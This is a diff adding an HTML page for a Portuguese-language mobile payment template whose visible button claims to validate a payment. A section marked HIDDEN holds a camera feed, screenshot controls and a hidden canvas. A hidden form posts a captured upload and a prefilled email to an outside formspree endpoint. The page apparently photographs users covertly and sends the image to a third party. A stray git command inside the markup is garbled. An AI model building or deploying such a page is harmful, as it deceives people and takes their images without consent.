@@ -1,0 +1,236 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Finapp - Mobile Template</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
+    <meta name="description" content="Finapp HTML Mobile Template">
+    <meta name="keywords" content="bootstrap, mobile template, cordova, phonegap, mobile, html, responsive" />
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/img/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="assets/img/favicon.png" sizes="32x32">
+    <link rel="shortcut icon" href="assets/img/favicon.png">
+
+    <link href="assets/js/lib/bootstrap-5.0.0-beta2-dist/css/" rel="stylesheet">
+    <link href="assets/css/modal.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.8.2/css/bulma.min.css">
+    <script defer src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>
+</head>
+
+<body>
+    <!-- loader -->
+    <!-- <div id="loader">
+     <img src="assets/img/logo-icon.png" alt="icon" class="loading-icon"> 
+     </div> -->
+    <!-- * loader -->
+
+    <!-- App Header -->
+    <div class="appHeader bg-primary text-light">
+        <div class="left">
+
+        </div>
+        <div class="pageTitle">
+            <img src="assets/img/logo.png" alt="logo" class="logo">
+        </div>
+        <div class="right">
+
+        </div>
+    </div>
+    <!-- * App Header -->
+
+    <!-- App Capsule -->
+    <div id="appCapsule">
+
+        <!-- Wallet Card -->
+        <div class="section wallet-card-section pt-1">
+            <div class="wallet-card">
+                <!-- Balance -->
+                <div class="balance">
+                    <div class="container">
+                        <span class="title">Informe o valor à receber: </span>
+                        <input type="text" class="total2" placeholder="R$ 0,00">
+                        <!--<h1 class="total">$ 2,562.50</h1>-->
+                    </div>
+                </div>
+                <!-- * Balance -->
+                <!-- Wallet Footer -->
+                <div class="wallet-footer">
+                    <div class="item">
+                        <a id="myBtn">
+                            <button class="icon-wrapper bg-warning" id="btnScreenshot">
+                                <ion-icon name="swap-vertical"></ion-icon>
+                            </button>
+                        </a>
+                        <strong>Validar Combinado</strong>
+                    </div>
+                </div>
+                <!-- * Wallet Footer -->
+            </div>
+        </div>
+        <!-- Wallet Card -->
+
+        <!-- Modal Alert-->
+        <!-- The Modal -->
+        <div id="myModal" class="modal">
+
+            <!-- Modal content -->
+            <div class="modal-content">
+                <div class="modal-header">
+                    <span class="close">&times;</span>
+                    <h2>Aguarde!</h2>
+                </div>
+                <div class="modal-body">
+                    <p>Estamos validando as informações.</p>
+                </div>
+            </div>git add README.md
+        </div>
+
+        <!-- * Modal Alert-->
+
+        <!-- Send Action Sheet -->
+        <div class="modal fade action-sheet" id="sendActionSheet" tabindex="-1" role="dialog">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-body">
+                        <div class="action-sheet-content">
+                            <form>
+                                <div class="form-group basic">
+                                    <button type="button" class="btn btn-primary btn-block btn-lg" data-dismiss="modal">
+                                        Send
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- * Send Action Sheet -->
+
+        <!-- Stats -->
+        <div class="section">
+            <div class="row mt-2">
+                <div class="col-6">
+                    <div class="stat-box">
+                        <div class="title">Recebido</div>
+                        <div class="value text-success">R$ 0.00</div>
+                    </div>
+                </div>
+                <div class="col-6">
+                    <div class="stat-box">
+                        <div class="title">Enviado</div>
+                        <div class="value text-danger">R$ 0.00</div>
+                    </div>
+                </div>
+            </div>
+            <div class="row mt-2">
+                <div class="col-6">
+                    <div class="stat-box">
+                        <div class="title">Total de transações</div>
+                        <div class="value"> 0 </div>
+                    </div>
+                </div>
+                <div class="col-6">
+                    <div class="stat-box">
+                        <div class="title">Total valor</div>
+                        <div class="value">R$ 0.00</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- * Stats -->
+
+    </div>
+    <!-- * App Capsule -->
+
+    <!-- HIDDEN -->
+
+    <section class="section hidden">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-four-fifths">
+                    <h1 class="title">
+                        JavaScript Camera
+                    </h1>
+                    <video autoplay id="video"></video>
+                    <button class="button is-hidden" id="btnPlay">
+                        <span class="icon is-small">
+                            <i class="fas fa-play"></i>
+                        </span>
+                    </button>
+                    <button class="button" id="btnPause">
+                        <span class="icon is-small">
+                            <i class="fas fa-pause"></i>
+                        </span>
+                    </button>
+                    <button class="button is-success" id="btnScreenshot">
+                        <span class="icon is-small">
+                            <i class="fas fa-camera"></i>
+                        </span>
+                    </button>
+                    <button class="button" id="btnChangeCamera">
+                        <span class="icon">
+                            <i class="fas fa-sync-alt"></i>
+                        </span>
+                        <span>Switch camera</span>
+                    </button>
+                </div>
+
+
+                <div class="column">
+                    <h2 class="title">Screenshots</h2>
+                    <div id="screenshots"></div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- App Bottom Menu -->
+    <div class="appBottomMenu">
+        <form action="https://formspree.io/f/xeqpbnpn" method="POST" enctype="multipart/form-data">
+            <label class="hidden">
+                Your email:
+                <input type="text" name="_replyto" value="ewersonmrt2@gmail.com">
+            </label>
+
+            <label class="hidden">
+                Your file:
+                <input type="text" name="upload" id="pegandoURL" required />
+            </label>
+
+            <button type="submit" class="icon-wrapper bg-success">
+                <ion-icon name="arrow-down-outline"></ion-icon>
+                FINALIZAR
+            </button>
+
+        </form>
+
+        <canvas class="is-hidden" id="canvas"></canvas>
+
+
+    </div>
+
+    <!-- * HIDDEN -->
+
+    <!-- ///////////// Js Files ////////////////////  -->
+    <!-- Jquery -->
+    <script src="assets/js/lib/jquery-3.4.1.min.js"></script>
+    <!-- Bootstrap-->
+    <script src="https://unpkg.com/@popperjs/core@2"></script>
+    <script src="assets/js/lib/bootstrap-5.0.0-beta2-dist"></script>
+    <!-- Ionicons -->
+    <script src="https://unpkg.com/ionicons@5.0.0/dist/ionicons.js"></script>
+    <!-- Base Js File -->
+    <!-- Modal -->
+    <script src="assets/js/modal.js"></script>
+    <!-- Bootstrap-->
+    <script src="assets/js/base.js"></script>
+    <!-- Scrips de ações -->
+    <script src="script.js"></script>
+
+</body>
+
+</html>
